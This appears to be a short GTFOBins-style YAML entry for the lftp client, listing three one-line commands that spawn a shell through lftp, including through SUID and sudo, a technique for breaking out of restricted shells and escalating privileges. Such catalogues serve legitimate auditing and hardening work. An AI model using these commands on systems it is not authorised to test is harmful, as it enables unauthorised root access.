---
functions:
  shell:
    - code: lftp -c '!/bin/sh'
  limited-suid:
    - code: ./lftp -c '!/bin/sh'
  sudo:
    - code: sudo lftp -c '!/bin/sh'
---
